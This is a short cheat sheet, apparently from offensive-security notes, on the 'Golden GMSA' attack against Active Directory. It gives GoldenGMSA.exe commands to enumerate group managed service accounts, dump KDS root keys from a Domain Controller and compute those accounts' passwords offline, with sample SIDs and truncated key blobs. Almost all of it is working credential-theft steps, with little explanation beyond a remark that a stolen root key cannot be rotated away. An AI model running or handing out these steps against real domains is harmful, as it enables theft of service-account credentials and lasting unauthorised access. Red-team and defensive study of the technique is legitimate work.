# Golden GMSA

### One notable difference between a Golden Ticket attack and the Golden GMSA attack is that they no way of rotating the KDS root key secret. Therefore, if a KDS root key is compromised, there is no way to protect the gMSAs associated with it.

## WARNING!: You can't "force reset" a gMSA password, because a gMSA's password never changes. The password is derived from the KDS root key and ManagedPasswordIntervalInDays , so every Domain Controller can at any time compute what the password is, what it used to be, and what it will be at any point in the future.

## Tool: GoldenGMSA https://github.com/Semperis/GoldenGMSA

#### 1) Enumerate all gMSAs

 - GoldenGMSA.exe gmsainfo

#### 2) Query for a specific gMSA

 - GoldenGMSA.exe gmsainfo --sid S-1-5-21-1437000690-1664695696-1586295871-1112

#### 3) Dump all KDS Root Keys

 - GoldenGMSA.exe kdsinfo

### With the --forest argument specifying the target domain or forest, SYSTEM privileges are required on the corresponding domain or forest Domain Controller. In case a child domain is specified, the parent domain keys will be dumped as well.

 - GoldenGMSA.exe kdsinfo --forest child.lab.local

#### 4) Dump a specific KDS Root Key

 - GoldenGMSA.exe kdsinfo --guid 46e5b8b9-ca57-01e6-e8b9-fbb267e4adeb

#### 5) Compute gMSA password

### --sid <gMSA SID>: SID of the gMSA (required)

### --kdskey <Base64-encoded blob>: Base64 encoded KDS Root Key

### --pwdid <Base64-encoded blob>: Base64 of msds-ManagedPasswordID attribute value

 - GoldenGMSA.exe compute --sid S-1-5-21-1437000690-1664695696-1586295871-1112 # requires

 - GoldenGMSA.exe compute --sid S-1-5-21-1437000690-1664695696-1586295871-1112 --kdskey "AQA[...]jG2/M=" --pwdid "AQAAAEtEU[...]gBsAGEAYgBzAAAA"

 
